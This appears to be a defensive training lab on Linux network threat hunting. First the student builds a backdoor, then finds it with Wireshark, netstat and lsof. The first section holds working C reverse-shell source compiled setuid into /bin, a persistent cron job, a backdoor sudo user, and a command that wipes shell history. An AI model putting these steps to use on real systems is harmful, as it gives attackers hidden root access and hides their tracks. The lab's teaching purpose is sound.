# Linux Network Hunting Lab

<iframe allowfullscreen height="360" src="https://www.youtube.com/embed/WSN4e7_1VJw?wmode=opaque" width="640"></iframe>  
In order for us to do a local hunt for a malicious Linux process, we
have to make ourselves a malicious process.

## Create Evil

First let's pretend we are a bad guy who just got access to a box and
are taking our first persistence steps.

    $ adduser backdooruser (and create new user) 
    $ usermod -aG sudo backdooruser
     $ su - backdooruser

Next place the following code for a reverse shell into a file named
mal.c and save it in your /bin directory:

    #include <stdio.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>

    int main(void){
    int port = 1337;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;      
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;      
    }

  
Then run the following commands:

    $ gcc mal.c -o /bin/mal 
    $ rm mal.c $ sudo chmod u+s /bin/mal 
    $ sudo crontab -e

Add line to cron file and save to set up the cron job:

    */5 * * * * /bin/mal

Once you have that done step out of the `su` back to your normal user
and run `$ nc -lp 1337` and in another window run `$ /bin/mal`.

You should have a root shell connect back. Confirm that this works
before moving forward.

Now let's clear out our command history with
`cat /dev/null > ~/.bash_history`, because we are sneaky little backdoor
hiders.

Kill the connection and start listening again.

# Network Hunting

We can use network traffic to identify evil, in fact, it just might be
the easiest way to initially detect something without having to go look
for it.

If malware is on your network, it is going to try to talk out to its
command and control server. There are plenty of ways to look at network
traffic, especially if you are a larger organization that has a security
monitoring setup like SecurityOnion.

## Hunting Packet Captures

This is the more common form of network hunting. Rather than being on
the potentially compromised box itself, we can just look at the packets
captured and search through it to find evil. This is the bread and
butter of most organization's defensive posture.

Set up Wireshark and begin capturing on the localhost interface (this is
essential because your reverse shell is heading to 127.0.0.1 and will
not wind up leaving the main interface. Wait for your reverse shell to
connect and then use the nc listener to run a few commands. Use ‘wget
https://st2.depositphotos.com/1000393/6507/i/950/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg’
as one of your commands.

Use the Wireshark capture you generated to find the malicious process
and data that was passed back and forth.

## Local Network Hunting

Locally, it should be easy to identify both your listening and connected
processes using the following commands. They all do something slightly
different but are very useful.

-   netstat -antp
-   netstat -la \| grep “LISTEN” “ESTABLISHED”
-   lsof -u
-   lsof -i

In the real world, we could set up a log monitoring system that would
check these sort of things on a regular basis but that is overkill for a
single host.

## Everyday Hunting

For everyday use on a Linux box I recommend the tool ntopng and
Wireshark for this purpose. ntop identifies processes making network
connections and alerts on them. If the process doesn't make sense when
it pops up, go to Wireshark and open up the stream to see if it makes
sense.

Assignment:

1.  Make sure you understand what the attacker did and why. Try to
    understand what the effect was of each command the attacker ran.
    This is some pretty complicated stuff.
2.  Write up a minimal report on the malicious actions taken by the
    attacker as well as information about the backdoor, according to the
    packet capture and the networking commands used. Include information
    from the command outputs' and Wireshark to provide detail. Do not go
    any further than this lab's content in your writeup.
